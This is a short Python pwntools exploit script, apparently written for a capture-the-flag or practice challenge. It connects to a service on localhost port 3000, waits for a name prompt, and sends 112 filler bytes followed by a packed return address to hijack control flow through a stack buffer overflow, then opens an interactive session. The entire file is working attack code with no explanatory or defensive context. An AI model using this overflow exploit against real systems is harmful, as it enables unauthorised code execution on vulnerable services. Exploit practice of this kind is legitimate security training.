# coding:utf-8
from pwn import remote, p32

host = "127.0.0.1"
port = 3000

r = remote(host, port)

r.recvuntil("name: ")

code = "A" * 112  # dummy
code += p32(0x80484fd)
print(code)
r.sendline(code)

r.interactive()
